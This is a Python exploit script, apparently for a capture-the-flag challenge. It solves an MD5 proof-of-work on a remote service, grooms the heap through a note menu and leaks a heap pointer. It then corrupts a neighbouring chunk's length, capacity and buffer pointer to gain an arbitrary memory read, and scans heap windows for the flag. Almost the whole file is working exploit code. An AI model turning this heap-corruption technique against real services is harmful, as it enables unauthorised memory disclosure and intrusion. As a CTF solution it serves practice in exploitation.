#!/usr/bin/env python3
"""Step2: use arbitrary read to scan heap windows for the flag."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 30410
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def drain(s, wait=0.8, bufsize=262144):
    s.settimeout(0.2)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        b = drain(self.s, 1.5)
        masked = re.search(rb"Token:\s*([A-Za-z_]+)", b).group(1).decode()
        md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", b).group(1).decode()
        ans = solve_pow(md5hex, masked)
        print("[pow] %s -> %s" % (masked, ans), flush=True)
        self.send(ans, 1.2)

    def send(self, line, wait=0.7):
        line = str(line)
        try:
            self.s.sendall(line.encode() + b"\n")
        except OSError as e:
            print("[SEND-FAIL %r]" % e, flush=True)
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata, 0.9)

    def edit(self, idx, length, hexdata, wait=0.9):
        self.send(2); self.send(idx); self.send(length)
        return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3)
        return self.send(idx, wait)

    def pack(self, idx):
        self.send(4)
        return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)
c.create(0, "A", 512, 512, "41" * 512)
c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)

d = parse(c.show(0))
B_buf = u64(d[2][0x30:0x38])
A_USER = B_buf - 0x60
print("[setup] A_user=0x%x top=0x%x" % (A_USER, u64(d[2][0x168:0x170])), flush=True)


def arb_read(addr, n):
    p = bytearray(b"\x00" * 0x38)
    p[0x18:0x20] = p64(0x41)
    p[0x20:0x28] = p64(n)
    p[0x28:0x30] = p64(n)
    p[0x30:0x38] = p64(addr)
    c.edit(0, 0x38, p.hex())
    r = c.show(1, wait=1.5 + n / 12000.0)
    dd = parse(r)
    if not dd or len(dd[2]) < n:
        print("[arb_read 0x%x n=%d] FAIL %r" % (addr, n, r[:100]), flush=True)
        return None
    return dd[2][:n]


def scan(tag, lo, n):
    print("\n== %s : 0x%x .. 0x%x (n=%d) ==" % (tag, lo, lo + n, n), flush=True)
    b = arb_read(lo, n)
    if b is None:
        return None
    hits = [m.start() for m in re.finditer(rb"[Ff][Ll][Aa][Gg]", b)]
    print("  'flag' hits at: %s" % [hex(lo + h) for h in hits], flush=True)
    for h in hits:
        print("   ->", repr(b[max(0, h - 8):h + 80]), flush=True)
    runs = re.findall(rb"[ -~]{8,}", b)
    print("  printable runs:", runs[:30], flush=True)
    return b


low = A_USER - 0x1000
b1 = scan("heap low (start-ish) .. A", low, 0x1000)
b2 = scan("A .. A+0x1000", A_USER, 0x1000)
if b1 is not None:
    print("\n[low first 8 qwords]", [hex(u64(b1[i:i + 8])) for i in range(0, 64, 8)], flush=True)
c.s.close()